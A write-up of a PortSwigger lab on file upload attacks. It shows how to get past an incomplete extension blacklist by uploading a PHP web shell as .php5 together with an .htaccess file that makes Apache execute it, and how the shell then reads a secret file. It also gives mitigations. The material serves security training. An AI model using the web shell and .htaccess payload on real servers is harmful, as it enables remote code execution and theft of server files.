# Web shell upload via extension blacklist bypass

**Source:** [PortSwigger](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)  
**Category:** File Upload  
**Difficulty:** Practitioner

## Objective
To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

## Vulnerability
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

### Steps

1. Log in to your account, go to the user profile (**My account**) and find the avatar upload form.

2. Try to upload a `shell.php` file with PHP code that reads the contents of `/home/carlos/secret`:
    ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    The application rejects the file, returning:
    ```text
    "Sorry, php files are not allowed"
    ```
    Conclusion: the `.php` extension is blacklisted, but the blacklist itself may be incomplete.

3. Test an alternative extension - upload a `shell.php5` file with the same PHP code. The application accepts the file:
    ```text
    "The file avatars/shell.php5 has been uploaded."
    ```
    Conclusion: the blacklist blocks `.php`, but **does not block `.php5`** - this is a fundamental blacklist misconfiguration (incomplete extension list).

4. Open the uploaded file URL in the browser:
    ```text
    https://0a6e007c03c2e4be844a464700120096.web-security-academy.net/files/avatars/shell.php5
    ```
    The server returns **PHP source code instead of the execution result**:
    ```text
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    Conclusion: Apache does not have `.php5` mapped to PHP - the file is served as static text. We need to change the Apache configuration via `.htaccess`.

5. Upload a `.htaccess` file with a rule mapping `.php5` to PHP:
    ```text
    Content-Disposition: form-data; name="avatar"; filename=".htaccess"
    Content-Type: application/octet-stream

    AddType application/x-httpd-php .php5
    ```
    The `.htaccess` file **is not blacklisted** (because it is not a PHP extension), so the upload succeeds:
    ```text
    "The file avatars/.htaccess has been uploaded."
    ```
    Apache, reading `.htaccess` in the `/files/avatars/` directory, starts treating `.php5` files as PHP.

6. Reopen the uploaded file URL in the browser:
    ```text
    https://0a6e007c03c2e4be844a464700120096.web-security-academy.net/files/avatars/shell.php5
    ```
    This time the server executes the PHP code - `file_get_contents` reads the contents of `/home/carlos/secret`, and `echo` outputs it in the HTTP response:
    ```text
    wZy0FXBV9F9ajlBD4HCZJ3ETYwPDtI2G
    ```

7. Copy the secret and submit it via the **Submit solution** button in the lab banner. Lab solved.

### Payload
```text
AddType application/x-httpd-php .php5
```

### Shortcut
1. Log in and go to **My account** -> avatar upload.
2. Upload `shell.php5` with `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
3. Upload `.htaccess` containing `AddType application/x-httpd-php .php5`.
4. Open `/files/avatars/shell.php5`.
5. Copy the returned secret and submit it via **Submit solution**.

## Impact
An attacker can bypass an incomplete extension blacklist by uploading a `.php5` file and then uploading a `.htaccess` file to make Apache execute `.php5` as PHP. This achieves remote code execution, allowing sensitive file reads, secret exfiltration, and potentially full server compromise.

## Mitigation
Use an allowlist of permitted file extensions instead of a blacklist. Do not allow `.htaccess` or other configuration files to be uploaded. Disable `AllowOverride` for upload directories so `.htaccess` cannot change Apache behavior. Store uploads outside the web root or in a directory with script execution disabled.

## Tools
- Burp Suite
- Repeater
- VSC

## Notes
- The blacklist blocks `.php` but not `.php5`.
- `.php5` is not mapped to PHP by default in Apache.
- `.htaccess` is not blacklisted and can be uploaded.
- `AddType application/x-httpd-php .php5` makes Apache execute `.php5` as PHP.
- Reopening `shell.php5` executes the payload and leaks the secret.